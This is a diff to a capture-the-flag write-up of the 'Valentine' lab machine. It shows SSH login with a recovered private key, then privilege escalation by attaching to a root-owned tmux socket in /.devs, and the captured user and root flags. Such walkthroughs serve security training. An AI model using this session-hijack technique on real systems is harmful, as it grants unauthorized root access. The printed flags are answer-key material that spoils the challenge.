@@ -530,21 +530,95 @@ sign_and_send_pubkey: no mutual signature supported
 hype@valentine.htb's password: 
 ```
 
-
-
 {% embed url="https://confluence.atlassian.com/bitbucketserverkb/ssh-rsa-key-rejected-with-message-no-mutual-signature-algorithm-1026057701.html" %}
 
+<figure><img src="../../.gitbook/assets/imagen (454).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+❯ ssh -i hype_key_decrypted -o PubkeyAcceptedKeyTypes=+ssh-rsa hype@valentine.htb
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$ cat user.txt 
+6bc88ec63253a9989e52f98e04571deb
+```
 
 
 
+```bash
+hype@Valentine:/.devs$ ps aux | grep tmux
+root       1048  0.0  0.1  26416  1668 ?        Ss   20:16   0:00 /usr/bin/tmux -S /.devs/dev_sess
+```
 
 
 
+```bash
+hype@Valentine:/$ ls -la
+total 108
+drwxr-xr-x  26 root root  4096 Aug 24  2022 .
+drwxr-xr-x  26 root root  4096 Aug 24  2022 ..
+drwxr-xr-x   2 root root  4096 Aug 24  2022 bin
+drwxr-xr-x   3 root root  4096 Feb 16  2018 boot
+drwxr-xr-x   2 root root  4096 Dec 11  2017 cdrom
+drwxr-xr-x  13 root root  3940 Feb 26 20:16 dev
+drwxr-xr-x   2 root root  4096 Dec 13  2017 devs
+drwxr-xr-x   2 root hype  4096 Feb 26 20:16 .devs
+drwxr-xr-x 132 root root 12288 Feb 26 20:16 etc
+drwxr-xr-x   3 root root  4096 Dec 11  2017 home
+lrwxrwxrwx   1 root root    32 Dec 11  2017 initrd.img -> boot/initrd.img-3.2.0-23-generic
+drwxr-xr-x  21 root root  4096 Dec 11  2017 lib
+drwxr-xr-x   2 root root  4096 Aug 24  2022 lib64
+drwx------   2 root root 16384 Dec 11  2017 lost+found
+drwxr-xr-x   3 root root  4096 Aug 24  2022 media
+drwxr-xr-x   3 root root  4096 Aug 24  2022 mnt
+drwx------   2 root root  4096 Dec 13  2017 opt
+dr-xr-xr-x  95 root root     0 Feb 26 20:16 proc
+drwx------   4 root root  4096 Feb 26 20:16 root
+drwxr-xr-x  20 root root   740 Feb 26 20:52 run
+drwxr-xr-x   2 root root  4096 Aug 24  2022 sbin
+drwxr-xr-x   2 root root  4096 Mar  5  2012 selinux
+drwxr-xr-x   2 root root  4096 Aug 24  2022 srv
+drwxr-xr-x  13 root root     0 Feb 26 20:16 sys
+drwxrwxrwt   5 root root  4096 Feb 26 20:52 tmp
+drwxr-xr-x  10 root root  4096 Aug 24  2022 usr
+drwxr-xr-x  14 root root  4096 Aug 25  2022 var
+lrwxrwxrwx   1 root root    29 Dec 11  2017 vmlinuz -> boot/vmlinuz-3.2.0-23-generic
+
+hype@Valentine:/$ cd .devs/
+
+hype@Valentine:/.devs$ ls -la
+total 8
+drwxr-xr-x  2 root hype 4096 Feb 26 20:16 .
+drwxr-xr-x 26 root root 4096 Aug 24  2022 ..
+srw-rw----  1 root hype    0 Feb 26 20:16 dev_sess
+
+hype@Valentine:/.devs$ file dev_sess 
+dev_sess: socket
+
+hype@Valentine:/.devs$ w
+ 20:53:51 up 37 min,  1 user,  load average: 0.04, 0.08, 0.15
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+hype     pts/0    10.10.14.2       20:52    0.00s  0.22s  0.00s w
+```
 
 
 
+```bash
+hype@Valentine:/.devs$ which tmux
+/usr/bin/tmux
+hype@Valentine:/.devs$ tmux -S dev_sess 
+```
 
 
 
-
-
+```bash
+root@Valentine:/.devs# whoami
+root
+root@Valentine:/.devs# cat /root/root.txt 
+80b5827011c2b2af7990c209464c96b4
+```
